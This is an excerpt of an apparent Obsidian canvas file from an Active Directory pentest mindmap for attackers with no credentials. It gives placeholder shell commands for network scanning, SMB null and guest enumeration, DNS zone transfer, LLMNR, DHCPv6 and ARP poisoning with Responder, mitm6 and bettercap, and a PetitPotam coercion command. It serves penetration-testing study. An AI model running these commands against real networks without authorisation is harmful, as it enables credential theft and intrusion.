		{"id":"82aa84c2dd769310","type":"text","text":"# Scan network\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/recon/port-scanning\n\n>[!example] Tools\n>- [Netexec ](https://github.com/Pennyw0rth/NetExec)\n>- [Nmap](https://github.com/nmap/nmap)\n>- [Nbtscan](https://github.com/resurrecting-open-source-projects/nbtscan)\n\n\n```shell\n# ping sweep\n⚪ for i in {1..254} ;do (ping -c 1 \"192.168.0.$i\" | grep \"bytes from\" &) ;done\n# nbns scan\n⚪ nbtscan '<network_range>'\n# enumerate smb hosts\n🕷️ nxc smb '<network_range>'\n# quick scan\n⚪ nmap -sS -sV -Pn '<target_ip>' -oA 'quick_tcp.scan'\n# full scan\n⚪ nmap -sS -p- -sVC -Pn '<target_ip>' -oA 'full_nmap_tcp.scan'\n```\n","x":-14038,"y":-7682,"width":1001,"height":641},
		{"id":"a51ff43beaed276d","type":"text","text":"# Find Domain Controllers IP\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/recon/dns#finding-domain-controllers\n\n>[!example] Tools\n>[Nslookup](https://linux.die.net/man/1/nslookup)\n\n```shell\n⚪ nslookup -type=SRV _ldap._tcp.dc._msdcs.'<domain>'\n```\n","x":-14038,"y":-7001,"width":1001,"height":400},
		{"id":"39e17383c9de3948","type":"text","text":"# Zone transfer\n>[!info] Theory\n>- https://www.thehacker.recipes/infra/protocols/dns#zone-transfers\n\n>[!example] Tools\n>[Dig](https://linux.die.net/man/1/dig)\n\n```shell\n⚪ dig axfr '<domain>'@'<dns_server>'\n```\n","x":-14038,"y":-6561,"width":1001,"height":400},
		{"id":"888d8a1f511e90d2","type":"text","text":"# Enumerate Guest Logon\n>[!info] Theory\n>- https://blog.whiteflag.io/blog/guest-vs-null-session-on-windows/\n\n>[!example] Tools\n>- [Netexec ](https://github.com/Pennyw0rth/NetExec)\n\n```shell\n# Check if guest access is enabled\n🕷️ nxc smb '<ip>' -u 'guest' -p '' \n# if enabled, enumerate shares\n🕷️ nxc smb '<ip>' -u 'guest' -p '' --shares\n```\n","x":-14038,"y":-6121,"width":1001,"height":460},
		{"id":"c1091e24c5e3d537","type":"text","text":"# Enumerate Null Session\n>[!info] Theory\n>- https://www.thehacker.recipes/infra/protocols/smb#null-session\n\n>[!example] Tools\n>- [Netexec ](https://github.com/Pennyw0rth/NetExec)\n\n```shell\n# Check if null session is enabled\n🕷️ nxc smb '<ip>' -u '' -p '' \n# if enabled, enumerate users\n🕷️ nxc smb '<ip>' -u '' -p '' --users\n```","x":-14038,"y":-5620,"width":1001,"height":459},
		{"id":"3bb5cea69d1fa14e","type":"text","text":"# 💥 Unauthent PetitPotam (CVE-2022-26925)\n>[!info] Theory\n> - https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr#resources\n\n>[!example] Tools\n>- [PetitPotam](https://github.com/topotam/PetitPotam)\n\n```shell\n⚪ PetitPotam.py -d '<domain>' '<attacker_ip>' '<target_ip>'\n```\n\n\n","x":-14018,"y":-3181,"width":981,"height":380},
		{"id":"606fe6f323242079","type":"text","text":"# Find users with OSINT\n>[!info] Theory\n>- 🛠️\n\n>[!example] Tools\n> - [Linkedin2Username](https://github.com/initstring/linkedin2username)\n> - [Username-Anarchy](https://github.com/urbanadventurer/username-anarchy)\n\n```shell\n# enumerate users on internet (OSINT) : \nLinkedin2Username\n# make username list : \nUsername-Anarchy\n```","x":-14038,"y":-5121,"width":1001,"height":480},
		{"id":"deef65a0ebb73960","type":"text","text":"# 🔥 LLMNR, NBTNS, MDNS poisoning\n>[!info] Theory\n> - https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/llmnr-nbtns-mdns-spoofing#llmnr-nbt-ns-mdns-spoofing\n\n>[!example] Tools\n>- [Responder](https://github.com/lgandx/Responder)\n```shell\n# use --lm to force LM downgrade\n# disable smb && http if relay\n⚪ responder -I '<interface>' \n```","x":-14038,"y":-4597,"width":1001,"height":470},
		{"id":"0da386d3f75f7a59","type":"text","text":"# 🚨 DHCPv6 poisoning\n>[!info] Theory\n> - https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/dhcpv6-spoofing#dhcpv6-spoofing-and-poisoning\n\n>[!example] Tools\n>- [Mitm6](https://github.com/dirkjanm/mitm6)\n\n```shell\n⚪ mitm6 -i '<interface>' -d '<domain>'\n```","x":-14038,"y":-4087,"width":1001,"height":420},
		{"id":"80ab9c9eab69d5cb","type":"text","text":"# ARP poisoning\n>[!info] Theory\n> - https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/arp-poisoning#arp-poisoning\n\n>[!example] Tools\n>- [Bettercap](https://www.bettercap.org/)\n\n```shell\n⚪ bettercap\n```","x":-14038,"y":-3621,"width":1001,"height":400},
		{"id":"3fd4b12daec35e0a","type":"text","text":"# NO CREDENTIALS","x":-14678,"y":-5418,"width":360,"height":50},
